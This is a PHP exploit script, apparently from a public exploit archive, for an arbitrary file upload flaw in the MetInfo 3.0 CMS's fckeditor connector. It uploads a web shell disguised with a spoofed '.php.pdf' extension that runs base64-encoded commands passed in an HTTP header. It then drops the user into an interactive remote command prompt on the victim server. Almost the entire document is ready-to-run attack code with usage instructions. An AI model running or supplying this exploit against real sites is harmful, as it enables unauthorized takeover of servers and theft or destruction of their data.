# Exploit Title: [MetInfo 3.0 (fckeditor) File Upload Exploit]
# Date: [02-11-2010]
# Author: [sh3n]
# Software Link: [http://www.metinfo.cn/upload/file/metinfo3.0.zip]
# Version: [3.0]
# Tested on: [BT4 Ubuntu, Windows 7 Ultimate]
# Exploit:
<?php
/*
MetInfo 3.0 Arbitrary File Upload Exploit
Vulnerable code metinfo.pe/fckeditor/editor/filemanager/connectors/php/upload.php
POC=>metinfo.pe/fckeditor/editor/filemanager/connectors/uploadtest.html
POC=>metinfo.pe/upload
Upload your shell.php.pdf (spoof ext.) will saved into /upload dir.
by sh3n http://guideshen.blogspot.com - @Guide_Shen - http://xsstorm.blogspot.com
*/
error_reporting(0);
set_time_limit(0);
ini_set("default_socket_timeout", 5);
function http_send($host, $packet)
{
 $sock = fsockopen($host, 80);
 while (!$sock)
 {
  print "\n[-] No response from {$host}:80 Trying again...";
  $sock = fsockopen($host, 80);
 }
 fputs($sock, $packet);
 while (!feof($sock)) $resp .= fread($sock, 1024);
 fclose($sock);
 return $resp;
}
print "\n+------------------------------------------------------------+";
print "\n|        MetInfo 3.0 File Upload (fckeditor) sh3n            |";
print "\n+------------------------------------------------------------+\n";
if ($argc < 2)
{
 print "\nUsage......: php $argv[0] metinfo.pe path";
 print "\nExample....: php $argv[0] localhost /fckeditor/\n";
 die();
}
$host = $argv[1];
$path = $argv[2];
$data  = "--xSsT0rm\r\n";
$data .= "Content-Disposition: form-data; name=\"NewFile\"; filename=\"sh3n.php.pdf\"\r\n";
$data .= "Content-Type: application/octet-stream\r\n\r\n";
$data .= "<?php \${print(_code_)}.\${passthru(base64_decode(\$_SERVER[HTTP_CMD]))}.\${print(_code_)} ?>\n";
$data .= "----xSsT0rm--\r\n";
$packet  = "POST {$path}/fckeditor/editor/filemanager/connectors/php/upload.php HTTP/1.0\r\n";
$packet .= "Host: {$host}\r\n";
$packet .= "Content-Length: ".strlen($data)."\r\n";
$packet .= "Content-Type: multipart/form-data; boundary=xSsT0rm\r\n";
$packet .= "Connection: close\r\n\r\n";
$packet .= $data;
preg_match("/OnUploadCompleted\((.*),\"(.*)\",\"(.*)\",/i", http_send($host, $packet), $html);
if (!in_array(intval($html[1]), array(0, 201))) die("\n[-] Upload failed! (Error {$html[1]})\n");
else print "\n[-] Shell uploaded to {$html[2]}...have phun!\n";
define(STDIN, fopen("php://stdin", "r"));
while(1)
{
 print "\nsh3n-box# ";
 $cmd = trim(fgets(STDIN));
 if ($cmd != "exit")
 {
  $packet = "GET {$path}upload/{$html[3]} HTTP/1.0\r\n";
  $packet.= "Host: {$host}\r\n";
  $packet.= "Cmd: ".base64_encode($cmd)."\r\n";
  $packet.= "Connection: close\r\n\r\n";
  $output = http_send($host, $packet);
  if (eregi("print", $output) || !eregi("_code_", $output)) die("\n[-] Exploit failed...\n");
  $shell = explode("_code_", $output);
  print "\n{$shell[1]}";
 }
 else break;
}
?>


      